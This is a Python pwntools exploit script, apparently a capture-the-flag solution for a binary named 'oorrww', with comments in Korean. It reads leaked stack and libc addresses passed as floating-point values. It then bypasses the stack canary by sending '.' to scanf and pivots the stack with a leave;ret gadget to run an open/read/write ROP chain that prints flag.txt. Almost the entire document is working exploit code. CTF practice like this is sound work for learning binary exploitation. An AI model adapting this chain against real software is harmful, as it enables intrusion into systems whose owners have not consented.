from pwn import *
import struct

# r = process("./oorrww")
r = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# %.16g 형식지정자를 사용하기 때문에 먼저 packing을 진행 후 unpacking을 진행
# 64비트 바이너리 데이터를 정수형으로 변환
def float_str_to_int(str):
    return u64(struct.pack("<d", float(str))) # '<' 리틀엔디안, 'd' 64비트(double) 부동 소수점 값을 나타냄

# %lf 형식지정자를 사용하여 입력을 받기 때문에 리틀엔디안형식에 바이트 문자열로 전환한 값을 unpacking하여 리틀엔디안형식에 부동 소수정 값으로 다시 전환
# 해석된 값이 문자열로 변환되면 불필요한 괄호와 쉼표가 포함되므로, 이 부분은 슬라이싱으로 제거해야함
# scanf로 입력되는 문자열은 ASCII 형식이어야 함 -> python은 기본적으로 UTF-8 형식에 인코딩방식이 적용되어있기때문에 해당 과정이 필요함
def int_to_float_str(num):
    return (str(struct.unpack("<d", p64(num))).encode("ascii"))[1:-2]

r.recvuntil(b"here are gifts for you: ")
stack = float_str_to_int(r.recvuntil(b" ")[:-1])
libc_base = float_str_to_int(r.recvuntil(b"!")[:-1]) - libc.symbols["__isoc99_scanf"]

print("stack: ", hex(stack))
print("libc_base: ", hex(libc_base))

leave_ret = libc_base + 0x4da83
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9

payload = []

# open flag.txt
payload.append(pop_rdi)
payload.append(stack + 0x80)
payload.append(pop_rsi)
payload.append(0)
payload.append(libc_base + libc.symbols["open"])

# read falg.txt
payload.append(pop_rdi)
payload.append(3) # fd
payload.append(pop_rsi)
payload.append(stack + 0x1000)
payload.append(pop_rdx_rbx)
payload.append(0x100)
payload.append(0)
payload.append(libc_base + libc.symbols["read"])

# write flag.txt
payload.append(pop_rdi)
payload.append(1)
payload.append(libc_base + libc.symbols["write"])
payload.append(u64(b"./flag.t")) 
payload.append(u64(b"xt\x00\x00\x00\x00\x00\x00"))
payload.append(0) #dummy

for i in range(19):
    r.sendlineafter(b"input:\n", int_to_float_str(payload[i]))

r.sendlineafter(b"input:\n", b".") # canary

r.sendlineafter(b"input:\n", int_to_float_str(stack - 0x8)) # reset rbp
pause()
r.sendlineafter(b"input:\n", int_to_float_str(leave_ret)) # leave_ret gadget

r.interactive()